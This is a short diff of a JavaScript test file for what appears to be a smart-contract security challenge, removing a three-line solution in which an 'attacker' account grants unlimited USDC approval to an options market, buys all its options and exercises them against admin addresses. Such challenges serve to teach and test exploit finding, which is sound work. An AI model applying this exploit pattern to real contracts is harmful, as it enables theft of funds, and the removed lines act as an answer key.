@@ -66,10 +66,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  await usdc.connect(attacker).approve(optionsMarket.address,ethers.constants.MaxUint256)
-  await optionsMarket.connect(attacker).purchase(await optionsContract.balanceOf(optionsMarket.address))
-  await optionsContract.connect(attacker).exercise(precision.mul(5),adminUserAddresses,{value:precision.mul(1)})
-
 });
 
 /// expected final state
